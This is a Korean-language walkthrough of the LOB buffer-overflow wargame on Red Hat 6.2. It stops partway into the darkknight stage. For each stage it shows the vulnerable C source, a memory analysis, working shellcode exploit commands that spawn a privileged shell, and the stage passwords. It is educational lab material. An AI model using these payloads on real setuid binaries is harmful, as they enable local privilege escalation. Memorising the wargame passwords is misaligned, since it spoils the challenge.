# Lord Of The BufferOverFlow 공략

옛날에 완전 대충 풀었던 것 같아, 다시 시작해본다. 코찔찔이던 시절에 풀면서 느낀 거랑 어느정도 머리가 커진 뒤 풀면서 느끼는게 좀 다른 거 같다.

gate / gate 로 접속

```shell
[gate@localhost gate]$ cat /etc/*release 
Red Hat Linux release 6.2 (Zoot)
[gate@localhost gate]$ getconf LONG_BIT
32
[gate@localhost gate]$ cat /proc/version 
Linux version 2.2.14-5.0 (root@porky.devel.redhat.com) (gcc version egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)) #1 Tue Mar 7 21:07:39 EST 2000
```

일단 LOB 환경에 대해서 살펴보도록 한다.

32 bit 운영체제이며 Red Hat 6.2이다. Red Hat 6.2는 ASLR이 적용되지 않아 메모리가 일정하다는 걸 알고 가자.

gdb로 gremlin을 실행시킨 뒤 메모리 맵을 살펴보면 반복해봐도 스택 공간(bfffe000-c0000000)이 일정하므로 역시 ASLR이 적용되지 않는다는 것을 확인할 수 있다. .text, .bss 뿐만아니라 library와 stack이 일정한 환경이다.

```shell
[gate@localhost gate]$ ps -a     
  PID TTY          TIME CMD
  644 tty1     00:00:00 bash
  ...
  848 pts/0    00:00:00 gdb
  850 pts/0    00:00:00 gremlin
  969 pts/1    00:00:00 ps
[gate@localhost gate]$ cat /proc/850/maps   
08048000-08049000 r-xp 00000000 08:06 177416     /home/gate/gremlin
08049000-0804a000 rw-p 00000000 08:06 177416     /home/gate/gremlin
40000000-40013000 r-xp 00000000 08:08 34138      /lib/ld-2.1.3.so
40013000-40014000 rw-p 00012000 08:08 34138      /lib/ld-2.1.3.so
40014000-40015000 rw-p 00000000 00:00 0
40018000-40105000 r-xp 00000000 08:08 34145      /lib/libc-2.1.3.soq
40105000-40109000 rw-p 000ec000 08:08 34145      /lib/libc-2.1.3.so
40109000-4010d000 rw-p 00000000 00:00 0
bfffe000-c0000000 rwxp fffff000 00:00 0

[gate@localhost gate]$ ps -a
  PID TTY          TIME CMD
  644 tty1     00:00:00 bash
  ...
  972 pts/0    00:00:00 gdb
  976 pts/0    00:00:00 gremlin
  978 pts/1    00:00:00 ps
[gate@localhost gate]$ cat /proc/976/maps 
08048000-08049000 r-xp 00000000 08:06 177416     /home/gate/gremlin
08049000-0804a000 rw-p 00000000 08:06 177416     /home/gate/gremlin
40000000-40013000 r-xp 00000000 08:08 34138      /lib/ld-2.1.3.so
40013000-40014000 rw-p 00012000 08:08 34138      /lib/ld-2.1.3.so
40014000-40015000 rw-p 00000000 00:00 0
40018000-40105000 r-xp 00000000 08:08 34145      /lib/libc-2.1.3.so
40105000-40109000 rw-p 000ec000 08:08 34145      /lib/libc-2.1.3.so
40109000-4010d000 rw-p 00000000 00:00 0
bfffe000-c0000000 rwxp fffff000 00:00 0
```



이제 본격적으로 문제 풀이를 시작해보잠

## STAGE 1: gate -> gremlin

```c
[gate@localhost gate]$ cat gremlin.c 
/*
	The Lord of the BOF : The Fellowship of the BOF 
	- gremlin
	- simple BOF
*/
 
int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

strcpy` 함수는 문자열 길이 검사를 안하고 NULL byte를 만나기 전까지 복사하므로 bof가 터진다. ASLR이 없으므로 라이브러리의 주소가 일정해서 특정 함수의 주소로 ret를 덮는 공격도 가능하고, 아까 봤던 위의 메모리 맵을 봤을 때, 이 프로세스의 Stack 공간에 실행권한이 존재하므로 스택에 쉘코드를 올리면 ret를 그 주소로 조작했을 때 해당 코드를 실행시키는 것 역시 가능하다.

어떤 공격 방법을 선택할지에 앞서, 우선 실제 메모리 상에서 `buffer`가 ret로부터 얼마 간 떨어져있는지 확인해보도록 하자. 다음을 보면 ebp-256 위치에 `buffer`가 존재하는 것을 확인할 수 있다.

```shell
0x804845c <main+44>:	mov    %edx,DWORD PTR [%eax]
0x804845e <main+46>:	push   %edx
0x804845f <main+47>:	lea    %eax,[%ebp-256]
0x8048465 <main+53>:	push   %eax
0x8048466 <main+54>:	call   0x8048370 <strcpy>
```



실제 ret 주소를 정확하게 알지를 못해서 (gdb 상에서 실행되는 경우는 gdb가 사용하는 환경변수 같은 애들 때문에 실제 주소와 약간의 오차가 존재한다.) 걍 nop sled로 간다. ret뿐만 아니라 ebp도 잘 설정해줘야함.

```shell
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*(0xf0-24)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*0x10+"\x10\xf9\xff\xbf"+"\x70\xf9\xff\xbf"'`
1󿿐h//shh/bin⏓ᙰ
              ̀󾱹ÿ¿
bash$ id
uid=500(gate) gid=500(gate) euid=501(gremlin) egid=501(gremlin) groups=500(gate)
bash$ my-pass
euid = 501
hello bof world
```



아니 생각해보니 굳이 이걸 정성스럽게 쓸 필요가 없다는 걸 느꼈다. 모르는 걸 새로 배우는 것도 아니니 걍 대충 빨리 넘어간다.



## STAGE 2 : gremlin -> cobolt

```c
[gremlin@localhost gremlin]$ cat cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

걍 bof 버퍼 뒤 쪽으로, 즉 main 스택 프레임보다 아래 쪽에  nop sled 하면 됨

```shell
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*0x10 + "\xe8\xfa\xff\xbf"+ "\x10\xfa\xff\xbf" + "\x90"*0x100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
黿¿󿐐1󿿐h//shh/bin⏓ᙰ
                  ̀ 
bash$ id
uid=501(gremlin) gid=501(gremlin) euid=502(cobolt) egid=502(cobolt) groups=501(gremlin)
bash$ my-pass
euid = 502
hacking exposed
```



## STAGE 3 : cobolt -> goblin

```c
[cobolt@localhost cobolt]$ cat goblin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```

걍 뚝딱

```shell
[cobolt@localhost cobolt]$ (python -c 'print "A"*0x10+"\x10\xfb\xff\xbf"+"\x10\xfb\xff\xbf"+"\x90"*0x100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"';cat)|./goblin    
AAAAAAAAAAAAAAAA󽑻ÿ¿1󿿐h//shh/bin⏓ᙰ
                                 ̀ 
id
uid=502(cobolt) gid=502(cobolt) euid=503(goblin) egid=503(goblin) groups=502(cobolt)
my-pass
euid = 503
hackers proof
```



## STAGE 4 : goblin -> orc

```c
[goblin@localhost goblin]$ cat orc.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}
```

환경변수에 쉘코드 등록시켜서 하는 방법을 막으려고 하는 듯하다. 저기 `argv[1][47]`를 체크하는 건 ret를 stack으로 만들어서 하라는 의도인 듯. 그냥 하던대로 하면 됨.

```shell
[goblin@localhost goblin]$ ./orc `python -c 'print "\x90"*40+"\x18\xfa\xff\xbf"+"\x40\xfa\xff\xbf"+"\x90"*0x100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
󾁺ÿ¿1󿿐h//shh/bin⏓ᙰ
                 ̀ 
bash$ id
uid=503(goblin) gid=503(goblin) euid=504(orc) egid=504(orc) groups=503(goblin)
bash$ my-pass
euid = 504
cantata
```





## STAGE 6 : orc -> wolfman

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}
	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

얘는 뭐 buffer 안에 쉘 코드 올리지 못하게 한 거 같은데 역시나 그냥 하던대로 하면 됨.

```shell
[orc@localhost orc]$ ./wolfman `python -c 'print "\x90"*40+"\xf8\xf9\xff\xbf"+"\x10\xfa\xff\xbf"+"\x90"*0x100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
򿽐󿐐1󿿐h//shh/bin⏓ᙰ
                ̀ 
bash$ id
uid=504(orc) gid=504(orc) euid=505(wolfman) egid=505(wolfman) groups=504(orc)
bash$ my-pass
euid = 505
love eyuna
```





## STAGE 7 : wolfman -> darkelf

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf 
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

이건 솔직히 좀 고민했다. 근데 생각해보니 입력은 어차피 줘야하는 거고 인자가 어디에 저장되는지를 떠올리니 금방 해결됐슴. 프로그램을 실행할 때 입력된 argv들은 메인 스택프레임보다 저어기 밑에 저장된다. 실행권한이 있는 스택이기 때문에 기계어 코드 실행가능. argv[1]의 길이만 검사하기 때문에 argv[2]로 payload를 넣으면 된다.

```shell
[wolfman@localhost wolfman]$ ./darkelf `python -c 'print "\x90"*40+"\x88\xf9\xff\xbf"+"\xb8\xfb\xff\xbf"+" "+"\x90"*0x100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
󿹻ÿ¿
bash$ id
uid=505(wolfman) gid=505(wolfman) euid=506(darkelf) egid=506(darkelf) groups=505(wolfman)
bash$ my-pass
euid = 506
kernel crashed
```

argv 확인. 저기 보면, 스택 가장 밑단에(가장 높은 주소) 실행 파일 이름(argv[0])와 argv로 들어간 값들을 확인할 수 있다. 메인 스택 플임 ebp+0x50 위치에는 argv[1]에 대한 포인터가 존재한다.

```shell
(gdb) x/100wx $ebp
0xbffff988:	0xbffff9a8	0x400309cb	0x00000003	0xbffff9d4
0xbffff998:	0xbffff9e4	0x40013868	0x00000003	0x08048450
0xbffff9a8:	0x00000000	0x08048471	0x08048500	0x00000003
0xbffff9b8:	0xbffff9d4	0x08048390	0x0804864c	0x4000ae60
0xbffff9c8:	0xbffff9cc	0x40013e90	0x00000003	0xbffffae3
0xbffff9d8:*0xbffffafc 	0xbffffb2d	0x00000000	0xbffffc46
0xbffff9e8:	0xbffffc58	0xbffffc70	0xbffffc8f	0xbffffcb1
0xbffff9f8:	0xbffffcbe	0xbffffe81	0xbffffea0	0xbffffebd
0xbffffa08:	0xbffffed2	0xbffffef1	0xbffffefc	0xbfffff15
0xbffffa18:	0xbfffff25	0xbfffff2d	0xbfffff3a	0xbfffff4b
0xbffffa28:	0xbfffff55	0xbfffff63	0xbfffff74	0xbfffff82
0xbffffa38:	0xbfffff8d	0xbfffffa0	0x00000000	0x00000003
0xbffffa48:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffa58:	0x00000006	0x00000006	0x00001000	0x00000007
0xbffffa68:	0x40000000	0x00000008	0x00000000	0x00000009
0xbffffa78:	0x08048450	0x0000000b	0x000001f9	0x0000000c
0xbffffa88:	0x000001f9	0x0000000d	0x000001f9	0x0000000e
0xbffffa98:	0x000001f9	0x00000010	0x0f8bfbff	0x0000000f
0xbffffaa8:	0xbffffade	0x00000000	0x00000000	0x00000000
0xbffffab8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffac8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffad8:	0x00000000	0x36690000	0x2f003638	0x656d6f68
0xbffffae8:	0x6c6f772f	0x6e616d66	0x7261642f	0x666c656b
0xbffffaf8:	0x0070632d	0x90909090	0x90909090	0x90909090
0xbffffb08:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb18:	0x90909090	0x90909090	0x90909090	0xbffffab8
0xbffffb28:	0xbffffc80	0x90909000	0x90909090	0x90909090
0xbffffb38:	0x90909090	0x90909090	0x90909090	0x90909090
...
0xbffffc18:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc28:	0x90909090	0x50c03190	0x732f2f68	0x622f6868
0xbffffc38:	0xe3896e69	0xe1895350	0xcd0bb099	0x00000080
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x00000000
...
0xbfffffc8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffffd8:	0x00000000	0x00000000	0x2f000000	0x656d6f68
0xbfffffe8:	0x6c6f772f	0x6e616d66	0x7261642f	0x666c656b
0xbffffff8:	0x0070632d	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/s 0xbfffffe8
0xbfffffe8:	 "/wolfman/darkelf-cp"
```

원래 엄청 지저분한데, environ이 다 초기화되서 구별하기 쉽다.

> 참고! Stack Layout https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html
>
> ```shell
> ========================
> LOW ADDRESS
> ------------------------
> local variables of main
> saved registers of main
> return address of main
> argc
> argv
> envp
> stack from startup code
> argc
> argv pointers
> NULL that ends argv[]
> environment pointers
> NULL that ends envp[]
> ELF Auxiliary Table
> argv strings
> environment strings
> program name
> NULL
> ------------------------
> HIGH ADDRESS
> ========================
> ```



## STAGE 8 : darkelf -> orge

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// here is changed!
	if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

아까랑 똑같은데 argv[0] 길이 체크하는 루틴이 생겨났다. 보고 생각나는 아이디어는 링크걸어서 이름 바꾸는 거랑 '././././/./././/./././orge' 막 이렇게 별 의미없는 문자를 더해서 하는 거였는데, 둘 다 됨. 

주의할 점은 gdb로 보는 건 /home/darkelf/./././orge 뭐 이렇게 되면서 argv[0]에 /home/darkelf 가 붙는다는 점인데, 실제로는 argv[0]가 shell에서 입력한게 들어가서 ./././orge 이런식으로 된다. 개수 착각해서 헛짓거리 많이 햇다...



```shell
[darkelf@localhost darkelf]$ ./DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD `python -c 'print "\x90"*40+"\x08\xf9\xff\xbf"+"\x68\xfb\xff\xbf"+" "+"\x90"*0x100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`                                             󾩻ÿ¿
bash$ id
uid=506(darkelf) gid=506(darkelf) euid=507(orge) egid=507(orge) groups=506(darkelf)
bash$ my-pass
euid = 507
timewalker
```



```shell
[darkelf@localhost darkelf]$ .////////////////////////////////////////////////////////////////////////orge `python -c 'print "\x90"*40+"\x08\xf9\xff\xbf"+"\x68\xfb\xff\xbf"+" "+"\x90"*0x100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`                                             󾩻ÿ¿
bash$ id
uid=506(darkelf) gid=506(darkelf) euid=507(orge) egid=507(orge) groups=506(darkelf)
bash$ my-pass
euid = 507
timewalker
```





## STAGE 9 : orge -> troll

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	// here is changed
	if(argc != 2){
		printf("argc must be two!\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// one more!
	memset(argv[1], 0, strlen(argv[1]));
}
```

argv[1] 사이즈 검사가 있는데 인자는 argv[1]까지 밖에 가질 수가 없다.... 으아아아 하다가 argv[0]이 남았다는 걸 깨달았다. 파일 이름을 쉘코드로 바꾸면 되는데, 자꾸 안되서 으어어어 하다가 결국 solve 찾아봣다. 다행히 내가 시도하던 방법이 맞긴 하더라.

다만 내가 쓰던 쉘코드는 \x2f가 포함되어 있었는데, \x2f는 `\` 라서 이걸 파일이름으로 사용하면 디렉토리로 읽는다던가 뭐 그런 이유때문이었다. 그래서 걍 다른 사람 쉘코드를 가져옴.



```shell
[orge@localhost orge]$ mv troll ./`python -c 'print "\x90"*200+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`

[orge@localhost orge]$ ./`python -c 'print "\x90"*200+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print "A"*40 + "\x28\xf9\xff\xbf" + "\x08\xfa\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(
bash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
bash$ my-pass
euid = 508
aspirin
```





## STAGE 10 : troll -> vampire

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}
```

이거 ㄹㅇ ??? 했따. lob 어렵네;; 근데 생각해보니 스택 구조를 보면 인자가 메인 스택 프레임보다 밑에 있으니(큰 주소) 인자를 졸라 많이 주면 메인 스택 프레임이 올라가게 된다. 한 0x10000 정도주면 올라가는듯.

아니 처음에는 0x90 개 많이 주고 뒤에 쉘코드 붙여서 할라했는데 0x90 이 녀석들 중간에 뜬금없이 0x00 이 존재했다. ;; 이게 뭔.. 그래서 으아아ㅡㅏ앙으ㅏㅢ 하다가 두 번째 인자를 베리 big하게 주고 ret 뒤에 비교적 작은 nop sled shellcode를 올려서 했음. 근데 이거도 쉘코드 이상한거로 계속해서 내 멘탈과 시간을 날려버림.

으ㅡ아ㅏ으ㅏ아

```shell
[troll@localhost troll]$ ./vampire `python -c 'print "\x90"*44+"\x40\xfa\xfe\xbf"+"\x90"*0x100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+" "+"\x90"*0x10000'`
@򿐐1󿿐h//shh/bin⏓ᙰ
                ̀ 
bash$ id
uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
bash$ my-pass
euid = 509
music world
```



아까 봤던 Stack Layout 구조 다시 소환

> 참고! Stack Layout https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html
>
> ```shell
> ========================
> LOW ADDRESS
> ------------------------
> local variables of main
> saved registers of main
> return address of main
> argc
> argv
> envp
> stack from startup code
> argc
> argv pointers
> NULL that ends argv[]
> environment pointers
> NULL that ends envp[]
> ELF Auxiliary Table
> argv strings
> environment strings
> program name
> NULL
> ------------------------
> HIGH ADDRESS
> ========================
> ```





## STAGE 11 : vampire -> skeleton

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - skeleton
        - argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i, saved_argc;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	// argc saver
	saved_argc = argc;

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// ultra argv hunter!
	for(i=0; i<saved_argc; i++)
		memset(argv[i], 0, strlen(argv[i]));
}
```

프로그램 이름을 바꾸는거랑, argc를 overflow 시키는거(시킬 수 있나?)가 생각난다. 다른 방법은 뭐가 있지.

일단 인자를 많이 줘서 argc를 overflow 시켜 음수 값으로 만드는 방법은 불가능한 듯하다. 실험해보니 argc는 short 형으로 선언되어 있는 듯하고, overflow 체크를 진행한다.

```shell
[vampire@localhost vampire]$ ./skeleton `python -c 'print "a "*32767'`
bash2: ./skeleton: Argument list too long
[vampire@localhost vampire]$ ./skeleton `python -c 'print "a "*32766'`
stack is still your friend.
```



그래서 그냥 프로그램 이름을 바꿔주는 방법으로 하기로 했다. 저거 이름에 쉘코드 뒤에 \x90 안 붙이면 안되고, 많이 안 붙이면 왜인지 인식이 안되는듯

```shell
[vampire@localhost vampire]$ mv skeleton `python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*100'`
[vampire@localhost vampire]$ ./`python -c 'print "\x90"'`* `python -c 'print "A"*44+"\x40\xff\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@ÿÿ¿
bash$ id
uid=509(vampire) gid=509(vampire) euid=510(skeleton) egid=510(skeleton) groups=509(vampire)
bash$ my-pass
euid = 510
shellcoder
```





## STAGE : skeleton -> golem

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - golem
        - stack destroyer
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // stack destroyer!
        memset(buffer, 0, 44);
	memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
}
```

ret 아래로 다 0으로 작살내버린다..!! 아뉘 그럼 어짜누...하다가 결국 LD_PRELOAD라는 힌트를 얻고 풀었다.. ㅠ

LD_PRELOAD로 등록시킨 라이브러리는 libc보다 우선적으로 메모리에 올라가며, libc랑 같은 이름의 함수가 존재할 경우, LD_PRELOAD에 존재하는 함수가 불리게 되는 굉장히 짱짱한 녀석이다. LD_PRELOAD로 등록시킨 라이브러리는 일반 라이브러리처럼 스택이 아닌 따로 메모리 공간을 할당받아 적제된다. 나는 여기서 끝인줄 알았는데, 알고보니 스택에 LD_PRELOAD로 등록시킨 라이브러리의 이름이 들어가더라. 위치는 스택의 끝(가장 낮은 주소) 부근이다.

본 문제의 제한 중에 ret를 반드시 스택의 주소로 덮어쓰워야 하는 조건이 있으니, LD_PRELOAD로 등록시키는 라이브러리의 이름에 쉘코드를 덮어씌우면 될 것 같다.

먼저, 쉘코드를 이름으로 하는 공유 라이브러리 오브젝트를 만들어 준다.

```shell
> vi /tmp/a.c
> cd /tmp
> gcc -shared -o `python -c 'print "\x90"*100 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81" + "\x90"*20'`.so a.c 
```



다음은 LD_PRELOAD로 등록시킨 라이브러리가 올라갔을 때의 메모리 맵이다.

```shell
[skeleton@localhost skeleton]$ cat /proc/1419/maps 
08048000-08049000 r-xp 00000000 08:06 209676     /home/skeleton/golem-cp
08049000-0804a000 rw-p 00000000 08:06 209676     /home/skeleton/golem-cp
40000000-40013000 r-xp 00000000 08:08 34138      /lib/ld-2.1.3.so
40013000-40014000 rw-p 00012000 08:08 34138      /lib/ld-2.1.3.so
40014000-40015000 rw-p 00000000 00:00 0
40015000-40016000 r-xp 00000000 08:08 22090      /tmp/鐞1ɱ2lÿ瀵󬩪ÿÿÿ2i00tii0cjo㐔⚱
                                                                                 ΁.so
40016000-40017000 rw-p 00000000 08:08 22090      /tmp/鐞1ɱ2lÿ瀵󬩪ÿÿÿ2i00tii0cjo㐔⚱
                                                                                 ΁.so
4001a000-40107000 r-xp 00000000 08:08 34145      /lib/libc-2.1.3.so
40107000-4010b000 rw-p 000ec000 08:08 34145      /lib/libc-2.1.3.so
4010b000-4010f000 rw-p 00000000 00:00 0
bfffe000-c0000000 rwxp fffff000 00:00 0
```

스택(0xbffffe000 ~ 0xc0000000) 공간 중 LD_PRELOAD의 이름이 적히는 공간이다. 메인 함수 프레임보다 훨씬 위에 존재한다.

```shell
0xbffff590:	0x4000380e	0x40014488	0x706d742f	0x9090902f
0xbffff5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5d0:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) 
0xbffff5e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff600:	0x5e11eb90	0x32b1c931	0xff0e6c80	0x01e98001
0xbffff610:	0x05ebf675	0xffffeae8	0x51c132ff	0x74303069
0xbffff620:	0x63306969	0xe48a6f6a	0xe28a5451	0xce0cb19a
0xbffff630:	0x90909081	0x90909090	0x90909090	0x90909090
0xbffff640:	0x90909090	0x6f732e90	0x40002900	0x40013868
0xbffff650:	0x4000220c	0xbffffb75	0x00000000	0x00000000
```



얍얍얍!

```shell
[skeleton@localhost skeleton]$ export LD_PRELOAD="/tmp/`python -c 'print "\x90"*100 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81" + "\x90"*20'`.so"

[skeleton@localhost skeleton]$ ./golem `python -c 'print "A"*44+"\xc0\xf5\xff\xbf"'`

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuÿ¿
bash$ id
uid=510(skeleton) gid=510(skeleton) euid=511(golem) egid=511(golem) groups=510(skeleton)
bash$ my-pass
euid = 511
cup of coffee
```





## STAGE : golem -> darknight

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/

#include <stdio.h>
